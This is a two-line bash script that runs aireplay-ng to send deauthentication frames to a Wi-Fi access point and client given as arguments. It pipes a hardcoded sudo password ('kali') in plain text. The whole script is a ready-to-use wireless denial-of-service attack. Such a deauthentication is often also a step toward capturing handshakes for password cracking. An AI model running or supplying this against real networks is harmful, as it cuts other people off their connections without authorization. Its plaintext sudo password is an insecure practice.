#! /bin/bash

echo 'kali' | sudo -S aireplay-ng -0 2 -a $1 -c $2 wlan0